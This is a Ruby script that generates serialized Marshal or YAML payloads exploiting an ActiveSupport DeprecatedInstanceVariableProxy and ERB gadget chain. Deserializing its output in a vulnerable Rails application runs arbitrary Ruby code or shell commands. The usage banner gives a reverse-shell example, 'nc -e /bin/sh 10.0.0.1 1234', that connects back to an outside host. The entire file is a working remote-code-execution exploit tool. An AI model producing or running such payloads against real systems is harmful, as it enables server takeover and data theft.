#!/usr/bin/env ruby

require "base64"
require "erb"
require "optparse"
require "yaml"
 
module ActiveSupport
  class Deprecation
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method, var, deprecator)
        @instance = instance
        @method = method
        @var = var
        @deprecator = deprecator 
      end
    end
  end
end
 
def get_content spec # use stdin if spec '-', content of spec file, or spec itself as content
  spec ? ( spec.strip == '-' ? STDIN.read : ( File.exists?(spec) ? File.open(spec,'r').read : spec ) ).strip : nil
end

serialization_formats = { :yaml => YAML, :marshal => Marshal }

opts = { :format => "marshal", :wrapper => 'hash' }
op = OptionParser.new 
op.banner = "usage: #{$0} [opts]\nexample: #{$0} -c 'nc -e /bin/sh 10.0.0.1 1234' > payload.bin"
op.on("-e", "--code code|filename|-", "Ruby code to execute") do |e| opts[:code] = get_content e end
op.on("-c", "--command command|filename|-", "Shell command to execute") do |c| opts[:command] = get_content c end
op.on("-f", "--format marshal|yaml", "Serialization format to use") {|f| opts[:format] = get_content(f).downcase}
op.on("-w", "--wrapper hash|none", "Wrapper to trigger invocation of any method on proxy instance") {|w| opts[:wrapper] = get_content(w).downcase}
op.parse!
 
if opts[:code] && opts[:command] || !opts[:code] && !opts[:command] then
  $stderr.puts "ERROR: must specify either ruby code (-e) or shell command (-c) "
  puts op
  exit
end

code = opts[:code] || "`#{opts[:command].gsub(/\`/,'\\\`')}`"

# create payload
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@lineno, 1
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation

case opts[:wrapper]
when 'hash'
  structure = {depr => 'something'} # make stringify_keys! happy
when 'none'
  structure = depr
else
  raise "Unknown wrapper type: #{opts[:wrapper]}"
end

serializer = serialization_formats[opts[:format].downcase.to_sym]
marshalled = serializer.dump(structure)
print marshalled
